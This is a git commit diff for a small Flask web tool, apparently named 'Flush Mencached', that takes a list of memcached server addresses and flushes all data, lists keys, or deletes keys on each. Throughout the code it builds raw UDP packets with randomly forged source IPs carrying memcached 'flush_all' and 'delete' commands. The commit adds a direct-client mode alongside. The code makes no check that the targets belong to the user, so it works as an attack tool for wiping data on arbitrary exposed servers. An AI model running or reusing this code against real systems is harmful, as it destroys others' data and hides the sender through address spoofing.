6c8e3817c9e4133fd44e5fe126d7c27961e89cf7
Air <root@wzh.me>
2019-01-17 21:46:14 +0800

    add use native ip and bugfix

--- main.py
+++ main.py
@@ -10,34 +10,42 @@ import string
 app = Flask(__name__)
 @app.route('/', methods=['GET', 'POST'])
 def hello():
-    html = '<title>Flush Mencached</title><h1>Flush Mencached</h1><form action="/" method="POST">Please input IP address(IP:PORT):<br><textarea name="data" rows="20" cols="22"></textarea><br>TODO:<input type="radio" name="todo" value="flushall">Flush ALL <input type="radio" name="todo" value="getkey">Get memc key <input type="radio" name="todo" value="delkey">Delete Key<input type="text" name="memckey"><br><br><input type="submit" value="Submit"></form>'
+    html = '<title>Flush Mencached</title><h1>Flush Mencached</h1><form action="/" method="POST">Please input IP address(IP:PORT):<br><textarea name="data" rows="20" cols="22"></textarea><br>TODO:<input type="radio" name="todo" value="flushall">Flush ALL <input type="radio" name="todo" value="getkey">Get memc key <input type="radio" name="todo" value="delkey">Delete Key<input type="text" name="memckey"><br>SRC IP:<input type="radio" name="srcip" value="forgedip">Forged IP <input type="radio" name="srcip" value="nativeip" checked>Native IP<br><br><input type="submit" value="Submit"></form>'
     if request.method == 'POST':
         if request.form['todo']=='flushall':
-            return html + '<br>--------<br>' + flushmemc(request.form['data'])
+            return html + '<br>--------<br>' + flushmemc(request.form['data'],request.form['srcip'])
         elif request.form['todo']=='getkey':
-            return html + '<br>--------<br>' + getmemckeylist(request.form['data'])
+            return html + '<br>--------<br>' + getmemckeylist(request.form['data'],request.form['srcip'])
         elif request.form['todo']=='delkey':
-            return html + '<br>--------<br>' + delmemckey(request.form['data'],request.form['memckey'])
+            return html + '<br>--------<br>' + delmemckey(request.form['data'],request.form['memckey'],request.form['srcip'])
         else:
             return html
     else:
         return html
 
-def flushmemc(data):
+def flushmemc(data,srcip):
     addresslist = data.split('\r\n')
     result = ''
     memccmd = '\x00\x00\x00\x00\x00\x01\x00\x00flush_all\r\n'
     for address in addresslist:
         if string.find(address,':')==-1:
             break
-        iplist = address.split(':')
-        srcip = randomip()
-        pkt = IP(src=srcip, dst=iplist[0])/UDP(sport=12345, dport=int(iplist[1]))/memccmd
-        send(pkt, inter=1, count=1)
-        result = result + address + ':OK<br>' 
+        if srcip=='forgedip':
+            iplist = address.split(':')
+            srcip = randomip()
+            pkt = IP(src=srcip, dst=iplist[0])/UDP(sport=12345, dport=int(iplist[1]))/memccmd
+            send(pkt, inter=1, count=1)
+            result = result + address + ':OK<br>'
+        else:
+            try:
+                mc = memcache.Client([address], debug=0)
+                mc.flush_all()
+                result = result + address + ':OK<br>'
+            except:
+                result = result + address + ':connection error<br>'
     return result
 
-def getmemckeylist(data):
+def getmemckeylist(data,srcip):
     addresslist = data.split('\r\n')
     result = ''
     for address in addresslist:
@@ -75,19 +83,35 @@ def getmemckey(ipaddress):
     except:
         return 'connection error'
 
-def delmemckey(data,key):
+def delmemckey(data,key,srcip):
     addresslist = data.split('\r\n')
     result = ''
-    memccmd = str('\x00\x00\x00\x00\x00\x01\x00\x00delete ' + '%s' % (key) + '\r\n')
-    for address in addresslist:
-        if string.find(address,':')==-1:
-            break
-        iplist = address.split(':')
-        srcip = randomip()
-        pkt = IP(src=srcip, dst=iplist[0])/UDP(sport=12345, dport=int(iplist[1]))/memccmd
-        send(pkt, inter=1, count=1)
-        result = result + address + ':OK<br>'
-    return result
+    if srcip=='forgedip':
+        memccmd = str('\x00\x00\x00\x00\x00\x01\x00\x00delete ' + '%s' % (key) + '\r\n')
+        for address in addresslist:
+            if string.find(address,':')==-1:
+                break
+            iplist = address.split(':')
+            srcip = randomip()
+            pkt = IP(src=srcip, dst=iplist[0])/UDP(sport=12345, dport=int(iplist[1]))/memccmd
+            send(pkt, inter=1, count=1)
+            result = result + address + ':OK<br>'
+        return result
+    else:
+        for address in addresslist:
+            if string.find(address,':')==-1:
+                break
+            try:
+                mc = memcache.Client([address], debug=0)
+                if mc.delete(key):
+                    result = result + address + ':OK<br>'
+                else:
+                    result = result + address + ':connection error<br>'
+            except:
+                result = result + address + ':connection error<br>'
+        return result
+        
+            
 
 def randomip():
     return socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
